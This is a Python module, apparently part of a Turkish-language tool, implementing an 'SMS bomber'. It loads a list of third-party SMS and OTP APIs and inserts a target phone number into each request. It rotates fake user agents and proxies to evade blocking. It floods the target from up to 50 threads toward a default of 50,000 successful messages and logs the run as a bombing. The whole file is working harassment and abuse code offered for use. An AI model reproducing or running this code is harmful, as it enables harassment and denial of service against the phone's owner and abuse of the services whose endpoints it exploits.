# modules/sms_bomber.py - V13.0 DRAGON EDITION (Detaylı Log)

import requests
import time
import random
import json
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from fake_useragent import UserAgent

class SendSms:
    def __init__(self, phone, proxy_manager=None, use_proxy=True, max_threads=30):
        self.phone = str(phone).strip()
        self.proxy_manager = proxy_manager
        self.use_proxy = use_proxy
        self.max_threads = min(max_threads, 50)
        self.ua = UserAgent()
        self.success_count = 0
        self.fail_count = 0
        self.api_stats = {}  # API bazlı istatistikler
        self.apis = self._load_apis()
        self.working_apis = []
        self._test_apis()
    
    def _log(self, mesaj, seviye="INFO"):
        """Log yaz"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open('data/tang_bomber.log', 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] [{seviye}] {mesaj}\n")
        except:
            pass
    
    def _load_apis(self):
        try:
            with open('data/apis.json', 'r', encoding='utf-8') as f:
                apis = json.load(f)
                self._log(f"{len(apis)} API yüklendi", "INFO")
                print(f"{Fore.GREEN}[+] {len(apis)} API yüklendi!{Style.RESET_ALL}")
                return apis
        except:
            self._log("apis.json bulunamadı!", "ERROR")
            print(f"{Fore.RED}[!] apis.json bulunamadı!{Style.RESET_ALL}")
            return []
    
    def _test_apis(self):
        """API'leri test et - HIZLI MOD"""
        if not self.apis:
            return
        
        self._log("API testi başlatıldı", "INFO")
        print(f"{Fore.YELLOW}[!] API'ler test ediliyor... (Hızlı Mod){Style.RESET_ALL}")
        test_count = min(len(self.apis), 30)
        
        for api in self.apis[:test_count]:
            try:
                url = api.get('url', '')
                method = api.get('method', 'POST').upper()
                params = api.get('params', {})
                
                filled_params = {}
                for k, v in params.items():
                    if isinstance(v, str):
                        filled_params[k] = v.replace('{phone}', self.phone)
                    else:
                        filled_params[k] = v
                
                headers = {"User-Agent": self.ua.random}
                proxy = self.proxy_manager.get_random_proxy() if self.use_proxy else None
                
                start_time = time.time()
                if method == 'POST':
                    r = requests.post(url, json=filled_params, headers=headers, proxies=proxy, timeout=5)
                else:
                    r = requests.get(url, params=filled_params, headers=headers, proxies=proxy, timeout=5)
                elapsed = time.time() - start_time
                
                if r.status_code in [200, 201, 202, 204]:
                    self.working_apis.append(api)
                    self._log(f"API çalışıyor: {api.get('name', 'Unknown')} ({elapsed:.2f} sn)", "INFO")
                    print(f"{Fore.GREEN}[+] {api.get('name', 'Unknown')} çalışıyor! ({elapsed:.2f} sn){Style.RESET_ALL}")
                else:
                    self._log(f"API başarısız: {api.get('name', 'Unknown')} - {r.status_code}", "WARNING")
            except Exception as e:
                self._log(f"API hatası: {api.get('name', 'Unknown')} - {str(e)[:50]}", "ERROR")
                pass
        
        self._log(f"{len(self.working_apis)} API çalışıyor", "INFO")
        print(f"{Fore.GREEN}[+] {len(self.working_apis)} API çalışıyor!{Style.RESET_ALL}")
    
    def _send_api(self, api):
        """Tek bir API'ye istek gönder - detaylı log"""
        api_name = api.get('name', 'Unknown')
        
        for attempt in range(3):
            try:
                url = api.get('url', '')
                method = api.get('method', 'POST').upper()
                params = api.get('params', {})
                
                filled_params = {}
                for k, v in params.items():
                    if isinstance(v, str):
                        filled_params[k] = v.replace('{phone}', self.phone)
                    else:
                        filled_params[k] = v
                
                headers = {
                    "User-Agent": self.ua.random,
                    "Accept": "application/json",
                    "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
                }
                
                proxy = self.proxy_manager.get_random_proxy() if self.use_proxy else None
                proxy_str = str(proxy) if proxy else "Yok"
                
                start_time = time.time()
                if method == 'POST':
                    r = requests.post(url, json=filled_params, headers=headers, proxies=proxy, timeout=8)
                else:
                    r = requests.get(url, params=filled_params, headers=headers, proxies=proxy, timeout=8)
                elapsed = time.time() - start_time
                
                if r.status_code in [200, 201, 202, 204]:
                    self.success_count += 1
                    # API istatistiklerini güncelle
                    if api_name not in self.api_stats:
                        self.api_stats[api_name] = {"success": 0, "fail": 0}
                    self.api_stats[api_name]["success"] += 1
                    
                    self._log(f"✅ {api_name} | {self.phone} | {r.status_code} | {elapsed:.2f} sn | Proxy: {proxy_str[:30]}", "INFO")
                    return {"success": True, "name": api_name, "elapsed": elapsed}
                else:
                    self.fail_count += 1
                    if api_name not in self.api_stats:
                        self.api_stats[api_name] = {"success": 0, "fail": 0}
                    self.api_stats[api_name]["fail"] += 1
                    
                    self._log(f"❌ {api_name} | {self.phone} | {r.status_code} | {elapsed:.2f} sn | Proxy: {proxy_str[:30]}", "WARNING")
                    return {"success": False, "name": api_name, "elapsed": elapsed}
            except Exception as e:
                if attempt == 2:
                    self.fail_count += 1
                    if api_name not in self.api_stats:
                        self.api_stats[api_name] = {"success": 0, "fail": 0}
                    self.api_stats[api_name]["fail"] += 1
                    self._log(f"❌ {api_name} | {self.phone} | HATA: {str(e)[:50]}", "ERROR")
                    return {"success": False, "name": api_name, "elapsed": 0}
                time.sleep(0.3)
        
        self.fail_count += 1
        if api_name not in self.api_stats:
            self.api_stats[api_name] = {"success": 0, "fail": 0}
        self.api_stats[api_name]["fail"] += 1
        return {"success": False, "name": api_name, "elapsed": 0}
    
    def run(self, target_count=50000):
        self.success_count = 0
        self.fail_count = 0
        self.api_stats = {}
        
        if not self.working_apis:
            self._log("Çalışan API yok!", "ERROR")
            print(f"{Fore.RED}[!] Çalışan API yok!{Style.RESET_ALL}")
            return 0, 0, {}
        
        self._log(f"{len(self.working_apis)} API ile başlatılıyor, hedef: {target_count}", "INFO")
        print(f"{Fore.CYAN}[*] {len(self.working_apis)} API ile başlatılıyor...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Thread: {min(self.max_threads, len(self.working_apis) * 2)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Proxy: {'Açık' if self.use_proxy else 'Kapalı'}{Style.RESET_ALL}")
        
        thread_count = min(self.max_threads, len(self.working_apis) * 2, 50)
        
        while self.success_count < target_count:
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                api_list = self.working_apis * 5
                random.shuffle(api_list)
                
                futures = {executor.submit(self._send_api, api): api for api in api_list[:thread_count*3]}
                
                for future in as_completed(futures):
                    if self.success_count >= target_count:
                        break
                    result = future.result()
                    if result.get('success'):
                        print(f"{Fore.GREEN}[+] {Style.RESET_ALL}{self.phone} --> {result['name']} ({result['elapsed']:.2f} sn)")
                    else:
                        print(f"{Fore.RED}[-] {Style.RESET_ALL}{self.phone} --> {result['name']}")
                    time.sleep(random.uniform(0.01, 0.05))
            
            if self.success_count < target_count:
                self._log(f"{self.success_count}/{target_count} tamamlandı, devam...", "INFO")
                print(f"{Fore.YELLOW}[!] {self.success_count}/{target_count} tamamlandı, devam...{Style.RESET_ALL}")
                time.sleep(0.2)
        
        self._log(f"BOMBALAMA TAMAMLANDI: {self.success_count} başarılı, {self.fail_count} başarısız", "INFO")
        return self.success_count, self.fail_count, self.api_stats